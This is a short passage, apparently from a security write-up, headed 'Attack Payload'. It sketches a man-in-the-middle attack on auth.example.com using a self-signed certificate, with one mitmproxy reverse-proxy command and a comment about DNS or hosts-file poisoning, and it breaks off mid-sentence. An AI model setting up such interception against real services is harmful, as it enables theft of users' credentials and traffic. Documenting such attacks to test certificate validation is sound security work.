**Attack Payload** (MITM using a forged/self-signed cert):
```bash
# Attacker sets up a rogue HTTPS endpoint with a self-signed cert
# and intercepts traffic, e.g. using mitmproxy:
mitmproxy --mode reverse:https://auth.example.com -p 8443

# Then poisons DNS or host file so that auth.example.com resolves
